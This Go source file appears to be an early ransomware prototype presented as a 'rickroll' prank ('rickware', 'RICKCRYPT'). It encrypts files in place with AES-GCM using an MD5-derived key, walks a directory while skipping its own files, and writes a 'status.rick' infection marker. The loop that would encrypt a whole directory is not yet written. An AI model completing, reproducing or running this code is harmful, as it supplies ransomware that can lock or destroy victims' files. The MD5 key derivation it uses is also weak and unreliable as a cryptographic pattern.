package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
)

var (
	eflag bool
	dflag bool

	filename   string
	passphrase string

	safe = []string{"rickware.exe", "AxInterop.WMPLib.DL", "Interop.WMPLib.DLL", "rickroll.mp4"}
)

func handleError(err error) {
	if err != nil {
		panic(err)
	}
}

func printError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func writeBytesToFile(filename string, data []byte) {
	f, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = f.Write(data)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return
	}

}

func createHash(key string) []byte {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hasher.Sum(nil)
}

func encrypt(data []byte, passphrase string) []byte {
	block, err := aes.NewCipher(createHash(passphrase))
	handleError(err)
	gcm, err := cipher.NewGCM(block)
	handleError(err)
	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	handleError(err)
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	handleError(err)

	gcm, err := cipher.NewGCM(block)
	handleError(err)

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)

	handleError(err)
	return plaintext
}

func encryptFile(filename, passphrase string) {
	data, err := ioutil.ReadFile(filename)
	handleError(err)
	f, err := os.Create(filename)
	handleError(err)
	defer f.Close()
	_, err = f.Write(encrypt(data, passphrase))
	handleError(err)
}

func decryptFile(filename, passphrase string) {
	data, err := ioutil.ReadFile(filename)
	handleError(err)
	datab := decrypt(data, passphrase)
	f, err := os.Create(filename)
	handleError(err)
	defer f.Close()
	_, err = f.Write(datab)
	handleError(err)
}

func contains(arr []string, str string) bool {
	for _, elem := range arr {
		if elem == str {
			return true
		}
	}
	return false
}

func encryptDir(dir string) {
	files, err := ioutil.ReadDir(dir)
	handleError(err)

	for _, f := range files {
		if f.Name() == "status.rick" {
			fmt.Println("[RICKCRYPT] Directory has already been encrypted")
			return
		}
	}

	writeBytesToFile("status.rick", []byte("never gonna give you up"))
}

func getFileList(dir string) ([]string, error) {
	fileList := make([]string, 0)
	dirList := make([]bool, 0)
	e := filepath.Walk(dir, func(path string, f os.FileInfo, err error) error {
		if !contains(safe, f.Name()) {
			fileList = append(fileList, path)
			dirList = append(dirList, f.IsDir())
		}
		return err
	})
	handleError(e)

	for i, file := range fileList {
		fmt.Println(file, dirList[i])
	}

	return fileList, nil
}

func main() {
	flag.BoolVar(&eflag, "e", false, "encrypts")
	flag.BoolVar(&dflag, "d", false, "decrypts")
	flag.StringVar(&filename, "f", "", "filename")
	flag.StringVar(&passphrase, "p", "", "passphrase")
	flag.Parse()

	// fmt.Println(eflag, dflag, filename, passphrase)
	getFileList("test")
	encryptDir("test")

	if len(filename) == 0 || len(passphrase) == 0 || (!eflag && !dflag) {
		flag.Usage()
		os.Exit(-1)
	}

	if eflag {
		encryptFile(filename, passphrase)
	} else if dflag {
		decryptFile(filename, passphrase)
	} else {
		flag.Usage()
		os.Exit(-1)
	}
}
